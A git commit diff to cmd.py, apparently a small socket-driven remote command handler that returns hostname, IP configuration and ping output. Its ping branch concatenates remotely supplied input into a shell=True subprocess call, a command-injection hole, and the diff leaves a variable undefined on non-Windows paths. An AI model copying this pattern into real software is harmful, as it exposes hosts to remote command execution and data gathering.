9ac3d3b65252ad7ac8de7dc88024aa4a58234cc8
Raph-Romeo <95073137+Raph-Romeo@users.noreply.github.com>
2022-11-24 10:16:02 +0100

    Update cmd.py

--- cmd.py
+++ cmd.py
@@ -1,5 +1,6 @@
 import sys
 import subprocess
+from socket import gethostname
 import os
 
 
@@ -7,18 +8,19 @@ def windows_command(cmd: str, conn) -> str:
     try:
         cmd = cmd.lower()
         if cmd == 'os':
-            return 'Operating System: Windows 10'
+            return 'Operating System: Windows 10\nMachine name: ' + gethostname()
         elif cmd == 'ip':
             return str(subprocess.check_output('ipconfig', shell=True)).replace('\\r\\n','\n').split("'",1)[1].split("'",1)[0]
+        elif cmd == 'ip -a':
+            return str(subprocess.check_output('ipconfig /all', shell=True)).replace('\\r\\n','\n').split("'",1)[1].split("'",1)[0]
         elif cmd == 'ram':
             return os.system('')
-        elif cmd == 'disconnect':
-            conn.close()
-            sys.exit()
+        elif cmd == 'disconnect' or cmd == 'exit' or cmd == 'quit':
+            return 'closing socket'
         elif cmd == 'kill':
-            return 'OK'
+            return 'closing socket'
         elif cmd == 'reset':
-            return 'OK'
+            return 'closing socket'
         elif cmd.split(' ')[0] == 'ping':
             ip = cmd.split(' ')[1]
             return str(subprocess.check_output('ping ' + ip, shell=True)).replace('\\r\\n','\n').split("'",1)[1].split("'",1)[0]
@@ -34,5 +36,8 @@ def cmd_run(connection, cmd:str) -> None:
     elif sys.platform == "darwin":
         print("NOT DONE YET") #MACOS
     elif sys.platform == "win32":
-        connection.send(windows_command(cmd,connection).encode())
+        data = windows_command(cmd,connection).encode()
+    connection.send(data)
+    if cmd == 'disconnect' or cmd == 'kill' or cmd == 'exit' or cmd == 'quit':
+        connection.close()
     sys.exit()
